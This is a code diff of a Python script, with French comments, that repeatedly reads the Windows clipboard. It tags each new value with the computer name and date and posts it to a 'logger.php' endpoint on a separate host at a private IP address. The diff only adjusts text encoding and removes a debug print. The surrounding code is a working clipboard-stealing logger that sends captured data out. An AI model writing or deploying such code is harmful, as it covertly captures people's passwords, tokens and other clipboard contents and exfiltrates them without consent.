@@ -14,16 +14,16 @@ def get_clip():
     global data
     global clip_name
     clip_name = pc_name + "_" + date + '\n'
-    clip.OpenClipboard()                                        # Ouverture du Clipboard
-    data = clip.GetClipboardData().encode("utf-8")              # Récupération du contenu du clipboard
-    clip.CloseClipboard()                                       # Fermeture du clipboard pour ne pas impacter la fonction
+    clip.OpenClipboard()                                                              # Ouverture du Clipboard
+    data = clip.GetClipboardData().decode("latin1").replace("#", '\\\\')              # Récupération du contenu du clipboard
+    clip.CloseClipboard()                                          # Fermeture du clipboard pour ne pas impacter la fonction
 
 
 def send(data):
     # AVEC REQUESTS
     url = 'http://192.168.35.68:8080/logger.php?log='
     url_log = url + clip_name + data
-    res = requests.post(url_log, data.decode("utf-8"))
+    res = requests.post(url_log, data.encode("utf-8"))
     print(res.text)
 
 
@@ -31,7 +31,6 @@ def main():
     dataSent = ''
     while True:
         get_clip()
-        print data + dataSent
         if data != dataSent:
             dataSent = data
             send(data)
